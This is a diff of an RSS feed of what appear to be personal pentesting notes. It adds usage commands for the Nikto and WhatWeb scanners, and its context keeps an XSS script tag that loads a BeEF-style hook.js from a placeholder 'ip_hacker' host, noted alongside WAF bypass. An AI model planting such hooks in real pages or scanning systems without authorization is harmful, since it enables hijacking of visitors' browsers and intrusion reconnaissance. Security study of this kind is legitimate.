@@ -4,7 +4,7 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Mon, 08 Aug 2022 22:44:52 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 12 Aug 2022 12:11:53 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
         <item>
@@ -182,6 +182,44 @@ nano config.yaml <span class="hljs-comment"># change username and password</span
 <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://ip_hacker:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
 
 <span class="hljs-comment">&lt;!-- use waf bypass --&gt;</span></code></pre></div>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Nikto | Whatweb]]></title>
+            <guid>a1d6a98098d344a2bd0d6d5e8832b8ba</guid>
+            <pubDate>Sat, 14 Aug 2021 08:21:31 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="nikto-httpsgithubcomsullonikto"><code>nikto</code> | <a title="https://github.com/sullo/nikto" href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></h1>
+<p><em>Website vulnerability Scanner</em></p>
+<div><pre class="hljs"><code><span class="hljs-comment"># scan domain </span>
+nikto -h http://0.0.0.0
+
+<span class="hljs-comment"># scan domain with ssl enabled</span>
+nikto -h https://0.0.0.0 -ssl</code></pre></div>
+<hr />
+<h1 id="whatweb-httpsgithubcomurbanadventurerwhatweb"><code>Whatweb</code> | <a title="https://github.com/urbanadventurer/WhatWeb" href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></h1>
+<p><em>WhatWeb identifies websites. It recognises <strong>web technologies</strong> including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.
+WhatWeb has over <strong>900 plugins</strong>, each to recognise something different. It also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.</em></p>
+<hr />
+<div><pre class="hljs"><code>whatweb 0.0.0.0
+
+whatweb --no-errors 10.10.10.0/24
+
+whatweb --aggression=Stealthy/Aggressive/Heavy --verbose 
+
+<span class="hljs-comment"># Scan example.com.</span>
+whatweb example.com
+
+<span class="hljs-comment"># Scan reddit.com slashdot.org with verbose plugin descriptions</span>
+whatweb -v reddit.com slashdot.org
+
+<span class="hljs-comment"># An aggressive scan of wired.com detects the exact version of WordPress.</span>
+whatweb -a 3 www.wired.com
+
+<span class="hljs-comment"># Scan the local network quickly and suppress errors</span>
+whatweb --no-errors 192.168.0.0/24
+
+<span class="hljs-comment"># Scan the local network for https websites</span>
+whatweb --no-errors --url-prefix https:// 192.168.0.0/24</code></pre></div>
 ]]></content:encoded>
         </item>
     </channel>
